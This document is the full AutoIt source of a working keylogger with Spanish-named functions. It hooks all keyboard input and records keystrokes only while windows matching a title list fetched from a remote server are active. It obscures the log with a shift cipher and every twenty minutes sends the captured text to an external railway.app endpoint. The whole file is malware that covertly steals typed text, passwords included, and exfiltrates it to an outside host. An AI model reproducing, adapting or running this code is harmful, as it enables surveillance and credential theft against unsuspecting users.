#include <WinAPI.au3>
#include <WindowsConstants.au3>
#include <InetConstants.au3>
#include <MsgBoxConstants.au3>
#include <Array.au3>

Opt('MustDeclareVars', 1)

Global $hHook, $file, $url = "https://kl.up.railway.app/?kl="
Global $file_name = @ComputerName & "_log.txt"
Global $last_send = 0
Global $buffer = "",$title_actual = "", $title_1 = ""

TrayItemSetOnEvent(-1, "Salir")

_Main()

Func Salir()
    WriteAndSendFile()
    MsgBox($MB_ICONINFORMATION, "Mensaje", "Se ha hecho clic en Salir")
    Exit
EndFunc
func _di($text); debug_info
	ToolTip($text, 100, 100)
	Sleep(5000) ; Espera 5 segundos
	ToolTip("") ; Oculta el mensaje contextual

EndFunc


Func _Main()
	
    Local $hmod
    $hHook = SetHook()
    $last_send = TimerInit()
	Global $aTitles
    If Not IsArray($aTitles) Then GetTitles()
	_di($aTitles)

    While 1
        Sleep(10)
        CheckActiveWindow()
        CheckAndSendFile()
    WEnd
EndFunc

Func SetHook()
    Local $hStub_KeyProc = DllCallbackRegister("_KeyProc", "long", "int;wparam;lparam")
    Local $hmod = _WinAPI_GetModuleHandle(0)
    Return _WinAPI_SetWindowsHookEx($WH_KEYBOARD_LL, DllCallbackGetPtr($hStub_KeyProc), $hmod)
EndFunc

Func WriteAndSendFile()
    If $file <> "" Then
        Local $currentActiveWindow = WinGetTitle("")
        $buffer = @CRLF & @CRLF & "====Title:" & $currentActiveWindow & "====Time:" & @YEAR & "." & @MON & "." & @MDAY & "--" & @HOUR & ":" & @MIN & ":" & @SEC & @CRLF & $buffer
        $buffer = CifrarDesplazamiento($buffer, 3)
        $buffer = BinaryToString(Binary($buffer))
        FileWrite($file, $buffer)
        $file = ""
    EndIf
EndFunc

Func CheckActiveWindow()
    Local $currentActiveWindow = WinGetTitle("")
    Static $lastActiveWindow = $currentActiveWindow, $lastActiveTime = TimerInit()
    If $currentActiveWindow <> $lastActiveWindow Then
        $lastActiveWindow = $currentActiveWindow
        $lastActiveTime = TimerInit()
    ElseIf TimerDiff($lastActiveTime) > 10000 Then
        WriteAndSendFile()
        $lastActiveTime = TimerInit()
    EndIf
EndFunc

Func CheckAndSendFile()
    If TimerDiff($last_send) > 1200000 Then
        If FileExists($file_name) Then
            Local $aArray = FileReadToArray($file_name)
            For $i = 0 To UBound($aArray) - 1
                InetRead($url & $aArray[$i], $INET_FORCERELOAD)
            Next
            FileOpen($file_name, $FO_OVERWRITE)
        EndIf
        $last_send = TimerInit()
    EndIf
EndFunc

Func _KeyProc($nCode, $wParam, $lParam)
    Local $tKEYHOOKS
    $tKEYHOOKS = DllStructCreate($tagKBDLLHOOKSTRUCT, $lParam)
    If $nCode < 0 Then Return _WinAPI_CallNextHookEx($hHook, $nCode, $wParam, $lParam)
    If $wParam = $WM_KEYDOWN Then EvaluateKey(DllStructGetData($tKEYHOOKS, "vkCode"))
    Return _WinAPI_CallNextHookEx($hHook, $nCode, $wParam, $lParam)
EndFunc

Func EvaluateKey($keycode)
    local $currentActiveWindow = WinGetTitle("")
    $buffer = key($keycode)
	Local $bFound = False

	For $i = 0 To UBound($aTitles) - 1
		If StringLeft($currentActiveWindow, StringLen($aTitles[$i])) = $aTitles[$i] Then
			$bFound = True
			ExitLoop
		EndIf
	Next
	If $bFound Then
        If $title_1 <> $currentActiveWindow Then
            $title_1 = $currentActiveWindow
            $buffer = @CRLF & @CRLF & "====Title:" & $title_1 & "====Time:" & @YEAR & "." & @MON & "." & @MDAY & "--" & @HOUR & ":" & @MIN & ":" & @SEC & @CRLF & $buffer
       EndIf
	   $buffer = CifrarDesplazamiento($buffer, 3)
	   FileWrite($file, $buffer)
	EndIf
	
EndFunc

Func GetTitles()
    Local $sURL = "https://kl.up.railway.app/l"
    Local $dData = InetRead($sURL)
    If @error Then Return
    Local $sContent = BinaryToString($dData)
    Local $aLines = StringSplit($sContent, ";", 1)
    Global $aTitles[$aLines[0]]
    For $i = 1 To $aLines[0]
        $aTitles[$i - 1] = $aLines[$i]
    Next
EndFunc

Func key($keycode)
    Local $buf = ""
    Switch $keycode
        Case 8
            $buf = "[backspace]"
        Case 9
            $buf = "[TAB]"
        Case 13
            $buf = "[ENTER]"
        Case 19
            $buf = "[PAUSE]"
        Case 20
            $buf = "[CAPSLOCK]"
        Case 27
            $buf = "[ESC]"
        Case 32 To 40, 42, 44 To 46, 48 To 57, 65 To 90, 91, 92, 106 To 127, 144 To 164, 186 To 192, 219 To 221
            $buf = Chr($keycode)
        Case Else
            $buf = ""
    EndSwitch
    Return $buf
EndFunc

Func DescifrarDesplazamiento($mensajeCifrado, $desplazamiento)
    Return CifrarDesplazamiento($mensajeCifrado, 997997 - $desplazamiento)
EndFunc

Func CifrarDesplazamiento($mensaje, $desplazamiento)
    Local $resultado = ""
    For $i = 1 To StringLen($mensaje)
        Local $caracter = StringMid($mensaje, $i, 1)
        Local $asciiValue = AscW($caracter)
        If $asciiValue >= 32 Then
            $caracter = ChrW(Mod($asciiValue - 32 + $desplazamiento, 997997) + 32)
        EndIf
        $resultado &= $caracter
    Next
    Return $resultado
EndFunc
